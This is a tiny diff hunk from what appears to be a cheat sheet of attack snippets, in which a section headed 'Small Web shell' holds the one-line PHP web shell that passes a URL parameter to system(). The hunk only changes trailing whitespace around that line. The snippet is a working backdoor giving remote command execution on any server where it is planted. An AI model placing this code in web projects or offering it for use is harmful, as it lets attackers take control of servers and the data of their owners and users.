@@ -86,7 +86,8 @@ s.close()
 ****PHP***  
 Small Web shell:  
 
-<?php system ($_GET[“cmd”]); ?>
+<?php system ($_GET[“cmd”]); ?>  
+
 
 
 
